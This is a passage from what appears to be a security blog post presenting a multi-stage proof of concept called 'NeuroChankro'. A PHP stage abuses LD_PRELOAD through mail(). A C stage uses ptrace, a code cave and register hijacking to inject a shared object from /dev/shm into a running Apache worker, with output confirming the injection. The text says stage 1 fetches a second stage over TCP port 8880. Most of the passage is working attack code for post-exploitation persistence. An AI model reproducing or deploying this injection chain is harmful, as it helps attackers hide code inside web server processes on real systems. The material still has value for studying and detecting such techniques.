        <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_SETREGS</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldregs</span><span class="p">);</span>
        <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_DETACH</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
 		<span class="n">free</span><span class="p">(</span><span class="n">oldcode</span><span class="p">);</span>
</code></pre></div></div>
<p>        
Et voilà</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gidorah@kaiju:|⇒  sudo cat /tmp/chivato 
PID: 15922
gidorah@kaiju:~|⇒  sudo cat /proc/15922/maps | grep ko
7f4b19690000-7f4b19691000 r-xp 00000000 00:11 120413                     /dev/shm/ko.so
7f4b19691000-7f4b19890000 ---p 00001000 00:11 120413                     /dev/shm/ko.so
7f4b19890000-7f4b19891000 rw-p 00000000 00:11 120413                     /dev/shm/ko.so
gidorah@kaiju:~|⇒  ps -aux | grep 15922
www-data  15922  0.0  0.8 284892 16532 ?        S    13:07   0:00 /usr/sbin/apache2 -k start
</code></pre></div></div>
<h2 id="poc--gtfo">PoC || GTFO</h2>
<p>        
This is just a proof of concept, so do not use it in production servers or in real operations. Learn the technique and then use it carefully. Of course <strong>everything here is based in a particular environment where ptrace_scope is 0 and suid_dumpable is set to 1</strong>. That is not a default situation.</p>

<p>        
I put here the 3 stages to let you test it and play a bit in local. The <strong>stage 1</strong> will try to contact the TCP port 8880 to download the <strong>stage 2</strong>. This was designed like a binary before thinking it as a shared object, so it has tons of fprintf() as debug.</p>

<p>        
<em>Sorry if the code makes you cry :(</em></p>

<p><strong>Stage 0</strong></p>
<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="cm">/* NeuroChankro PoC - Stage 0 (x86_64) */</span>
<span class="nb">error_reporting</span><span class="p">(</span><span class="kc">E_ALL</span><span class="p">);</span>
<span class="c1">// Save our PID so we can inject ourself here</span>
<span class="nb">putenv</span><span class="p">(</span><span class="s1">'NEUROCHANKRO='</span> <span class="mf">.</span> <span class="nb">getmypid</span><span class="p">());</span>
<span class="k">echo</span> <span class="s2">"Trying to inject at... "</span> <span class="mf">.</span> <span class="nb">getmypid</span><span class="p">();</span>

<span class="c1">// IP to contact and download the stage2</span>
<span class="nb">putenv</span><span class="p">(</span><span class="s1">'DOUBLEC=127.0.0.1'</span><span class="p">);</span>

<span class="c1">// Do the magic</span>
<span class="nb">putenv</span><span class="p">(</span><span class="s1">'LD_PRELOAD=/var/www/html/neuro/stage1.so'</span><span class="p">);</span>
<span class="nb">mail</span><span class="p">(</span><span class="s1">'a'</span><span class="p">,</span><span class="s1">'a'</span><span class="p">,</span><span class="s1">'a'</span><span class="p">,</span><span class="s1">'a'</span><span class="p">);</span>
<span class="nb">sleep</span><span class="p">(</span><span class="mi">30</span><span class="p">);</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>
<p><strong>Stage 1</strong></p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* NeuroChankro PoC - Stage 1 (x86_64) */</span>

<span class="cm">/* Just a simple PoC*/</span>
<span class="cm">/* Based on this https://blog.xpnsec.com/linux-process-injection-aka-injecting-into-sshd-for-fun/ */</span>

<span class="cp">#define _GNU_SOURCE
</span>

<span class="cp">#include</span> <span class="cpf">&lt;arpa/inet.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;dlfcn.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;signal.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/ptrace.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/user.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;wait.h&gt;</span><span class="cp">
</span>
<span class="cp">#define LIBDLSO "libdl-2.19.so" // Just hardcoded because this is a PoC
#define CAVE_SIZE 500 // Totally random choice
#define SHM_NAME "ko.so"
</span>
<span class="c1">// Check for ptrace_scope</span>
<span class="kt">int</span> <span class="nf">check_yama</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">fd</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">scope</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span>
    <span class="kt">ssize_t</span> <span class="n">n</span><span class="p">;</span>

    <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/proc/sys/kernel/yama/ptrace_scope"</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[-] Error: could not open ptrace_scope</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">n</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">scope</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">n</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[-] Error: could not read ptrace_scope</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">atoi</span><span class="p">(</span><span class="n">scope</span><span class="p">);</span> 
<span class="p">}</span>

<span class="c1">// Find a region for our code cave</span>
<span class="c1">// Copied from https://github.com/gaffe23/linux-inject/blob/master/utils.c</span>

<span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="nf">freespaceaddr</span><span class="p">(</span><span class="n">pid_t</span> <span class="n">pid</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">filename</span><span class="p">[</span><span class="mi">30</span><span class="p">];</span>
    <span class="kt">char</span> <span class="n">line</span><span class="p">[</span><span class="mi">850</span><span class="p">];</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">addr</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">str</span><span class="p">[</span><span class="mi">20</span><span class="p">];</span>
    <span class="kt">char</span> <span class="n">perms</span><span class="p">[</span><span class="mi">5</span><span class="p">];</span>
    <span class="n">sprintf</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">"/proc/%d/maps"</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>
    <span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span>
    <span class="k">if</span><span class="p">(</span><span class="n">fp</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
    <span class="k">while</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="mi">850</span><span class="p">,</span> <span class="n">fp</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="n">sscanf</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">"%lx-%*lx %s %*s %s %*d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">addr</span><span class="p">,</span> <span class="n">perms</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>

        <span class="k">if</span><span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">perms</span><span class="p">,</span> <span class="s">"r-xp"</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span>
        <span class="p">{</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">addr</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// Use this function to calculate the dlopen() addr in remote pid</span>
<span class="c1">// This is needed because of ASLR :(</span>
<span class="c1">// IMPORTANT!!!! I hardcoded the name of the .so as LIBDLSO because it is just a PoC. You need to retrieve it at runtime ;D</span>
<span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="nf">dlopen_addr</span><span class="p">(</span><span class="n">pid_t</span> <span class="n">pid</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">remote_libdl_base</span><span class="p">,</span> <span class="n">offset_dlopen</span><span class="p">,</span> <span class="n">remote_dlopen_address</span><span class="p">;</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">local_libdl_base</span><span class="p">,</span> <span class="o">*</span><span class="n">local_dlopen_address</span><span class="p">;</span>
    <span class="kt">char</span> <span class="n">path</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
    <span class="kt">char</span> <span class="n">line</span><span class="p">[</span><span class="mi">850</span><span class="p">];</span>
    <span class="kt">FILE</span> <span class="o">*</span><span class="n">fp</span><span class="p">;</span>

    <span class="c1">// First we need to load libdl and save the address (debug purposes)</span>
    <span class="n">local_libdl_base</span> <span class="o">=</span> <span class="n">dlopen</span><span class="p">(</span><span class="n">LIBDLSO</span><span class="p">,</span> <span class="n">RTLD_LAZY</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">local_libdl_base</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[-] Error: could not load local %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">LIBDLSO</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[+] Local %s address at %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">LIBDLSO</span><span class="p">,</span> <span class="n">local_libdl_base</span><span class="p">);</span>
    
    <span class="c1">// Next we are going to resolve the dlopen() symbol</span>
    <span class="n">local_dlopen_address</span> <span class="o">=</span> <span class="n">dlsym</span><span class="p">(</span><span class="n">local_libdl_base</span><span class="p">,</span> <span class="s">"dlopen"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">local_dlopen_address</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[-] Error: local dlopen() not found!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[+] Address of local dlopen at %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">local_dlopen_address</span><span class="p">);</span>
    
    <span class="c1">// Read local address</span>
    <span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">"/proc/self/maps"</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span>
    <span class="k">while</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="mi">850</span><span class="p">,</span> <span class="n">fp</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">sscanf</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">"%llx-%*lx %*s %*s %*s %*d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">local_libdl_base</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="n">LIBDLSO</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span> 
    <span class="c1">// Calculate the offset (libdl address - dlopen address)</span>
    <span class="n">offset_dlopen</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span><span class="p">)</span> <span class="p">(</span><span class="n">local_dlopen_address</span> <span class="o">-</span> <span class="n">local_libdl_base</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[+] Offset of dlopen(): 0x%llx bytes</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">offset_dlopen</span><span class="p">);</span>
    
    <span class="c1">// Now we need to extract the remote libdl address</span>
    <span class="n">snprintf</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">path</span><span class="p">),</span> <span class="s">"/proc/%d/maps"</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span> 
    <span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span>
    <span class="k">while</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="mi">850</span><span class="p">,</span> <span class="n">fp</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">sscanf</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="s">"%llx-%*lx %*s %*s %*s %*d"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">remote_libdl_base</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">strstr</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="n">LIBDLSO</span><span class="p">)</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">break</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
    <span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
 <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[+] Remote %s address at 0x%llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">LIBDLSO</span><span class="p">,</span> <span class="n">remote_libdl_base</span><span class="p">);</span>
        
    <span class="c1">// And finally calculate the address of the remote dlopen</span>
    <span class="n">remote_dlopen_address</span> <span class="o">=</span> <span class="n">remote_libdl_base</span> <span class="o">+</span> <span class="n">offset_dlopen</span><span class="p">;</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[+] Remote dlopen() address at 0x%llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">remote_dlopen_address</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">remote_dlopen_address</span><span class="p">;</span>
<span class="p">}</span>


<span class="c1">// Primitives are taken from https://github.com/xpn/ssh-inject/blob/master/inject.c</span>
<span class="kt">void</span> <span class="nf">ptraceRead</span><span class="p">(</span><span class="kt">int</span> <span class="n">pid</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">int</span> <span class="n">len</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">long</span> <span class="n">word</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">data</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="n">i</span><span class="o">+=</span><span class="k">sizeof</span><span class="p">(</span><span class="n">word</span><span class="p">),</span> <span class="n">word</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">((</span><span class="n">word</span> <span class="o">=</span> <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_PEEKTEXT</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="n">addr</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{;</span>
            <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[-] Error reading process memory</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
            <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="n">ptr</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">word</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">ptraceWrite</span><span class="p">(</span><span class="kt">int</span> <span class="n">pid</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">,</span> <span class="kt">int</span> <span class="n">len</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">long</span> <span class="n">word</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>

    <span class="k">for</span><span class="p">(</span><span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">len</span><span class="p">;</span> <span class="n">i</span><span class="o">+=</span><span class="k">sizeof</span><span class="p">(</span><span class="n">word</span><span class="p">),</span> <span class="n">word</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">word</span><span class="p">,</span> <span class="n">data</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">word</span><span class="p">));</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_POKETEXT</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="n">addr</span> <span class="o">+</span> <span class="n">i</span><span class="p">,</span> <span class="n">word</span><span class="p">)</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{;</span>
            <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[-] Error writing to process memory</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
            <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">injectme</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// To do the call and SIGTRAP (int3)</span>
    <span class="n">asm</span><span class="p">(</span>
        <span class="s">"mov $2, %esi</span><span class="se">\n</span><span class="s">"</span>
        <span class="s">"call *%rax</span><span class="se">\n</span><span class="s">"</span>
        <span class="s">"int $0x03</span><span class="se">\n</span><span class="s">"</span>
    <span class="p">);</span>
<span class="p">}</span>
<span class="c1">// Attach using ptrace</span>
<span class="kt">void</span> <span class="nf">infector</span><span class="p">(</span><span class="n">pid_t</span> <span class="n">pid</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">p_check</span><span class="p">,</span> <span class="n">waitpidstatus</span><span class="p">;</span>
    <span class="k">struct</span> <span class="n">user_regs_struct</span> <span class="n">oldregs</span><span class="p">,</span> <span class="n">regs</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">code_cave_address</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">oldcode</span><span class="p">;</span> 
    
    <span class="n">p_check</span> <span class="o">=</span> <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_ATTACH</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">p_check</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[-] Error: ptrace could not attach to given pid</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">waitpid</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">waitpidstatus</span><span class="p">,</span> <span class="n">WUNTRACED</span><span class="p">)</span> <span class="o">!=</span> <span class="n">pid</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[-] Error: waitpid() failed!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[+] Attached to process %d successfully!</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">pid</span><span class="p">);</span>
    <span class="c1">// Get a copy of registers</span>
    <span class="n">p_check</span> <span class="o">=</span> <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_GETREGS</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldregs</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">p_check</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[-] Error: could not retrieve cpu registers</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>

    <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">regs</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">oldregs</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">user_regs_struct</span><span class="p">));</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[+] CPU registers backup done!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    
    <span class="c1">// Find a memory region with executable perms</span>
    <span class="n">code_cave_address</span> <span class="o">=</span> <span class="n">freespaceaddr</span><span class="p">(</span><span class="n">pid</span><span class="p">)</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">code_cave_address</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[-] Error: executable region not found!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
    <span class="p">}</span>
    
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[+] Possible region for a code cave located at 0x%llx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">code_cave_address</span><span class="p">);</span>
    
    <span class="c1">// Backup whatever there is at that region    </span>
    <span class="n">oldcode</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span><span class="p">)</span> <span class="n">malloc</span><span class="p">(</span><span class="n">CAVE_SIZE</span><span class="p">);</span>
    <span class="n">ptraceRead</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="n">code_cave_address</span><span class="p">,</span> <span class="n">oldcode</span><span class="p">,</span> <span class="n">CAVE_SIZE</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[+] Original code backup done!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

    <span class="c1">// Now is time to overwrite the code cave with our code   </span>
    <span class="n">ptraceWrite</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="n">code_cave_address</span><span class="p">,</span> <span class="s">"/dev/shm/ko.so</span><span class="se">\x00</span><span class="s">"</span><span class="p">,</span> <span class="mi">16</span><span class="p">);</span> <span class="c1">// Shared Object location</span>
    <span class="n">ptraceWrite</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="n">code_cave_address</span> <span class="o">+</span> <span class="mi">16</span><span class="p">,</span> <span class="s">"</span><span class="se">\x90\x90\x90\x90\x90\x90\x90\x90</span><span class="s">"</span><span class="p">,</span> <span class="mi">8</span><span class="p">);</span>
    <span class="n">ptraceWrite</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="n">code_cave_address</span> <span class="o">+</span> <span class="mi">16</span> <span class="o">+</span> <span class="mi">8</span><span class="p">,</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">injectme</span><span class="p">)</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">32</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[+] Stub code injected!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

    <span class="c1">// Change program counter to our inserted code</span>
    <span class="n">regs</span><span class="p">.</span><span class="n">rip</span> <span class="o">=</span> <span class="n">code_cave_address</span> <span class="o">+</span> <span class="mi">16</span> <span class="o">+</span> <span class="mi">8</span><span class="p">;</span>
    
    <span class="c1">// Now we need to follow the call convention so:</span>
    <span class="c1">// - RAX =&gt; must be the address of remote dlopen()</span>
    <span class="c1">// - RSI =&gt; address where "/tmp/inject.so" string lies (first dlopen parameter)</span>
    <span class="c1">// - RDI =&gt; RTLD_LAZY value -2- (second dlopen parameter)</span>
    <span class="n">regs</span><span class="p">.</span><span class="n">rax</span> <span class="o">=</span> <span class="n">dlopen_addr</span><span class="p">(</span><span class="n">pid</span><span class="p">);</span>
    <span class="n">regs</span><span class="p">.</span><span class="n">rdi</span> <span class="o">=</span> <span class="n">code_cave_address</span><span class="p">;</span>
    <span class="n">regs</span><span class="p">.</span><span class="n">rsi</span> <span class="o">=</span> <span class="mi">2</span><span class="p">;</span>
    <span class="n">ptrace</span><span class="p">(</span><span class="n">PTRACE_SETREGS</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">regs</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[+] Remote process registers fixed!</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>   
    
    <span class="c1">// At this point everything is set to execute a dlopen("/tmp/inject.so, RTLD_LAZY) inside the remote process</span>
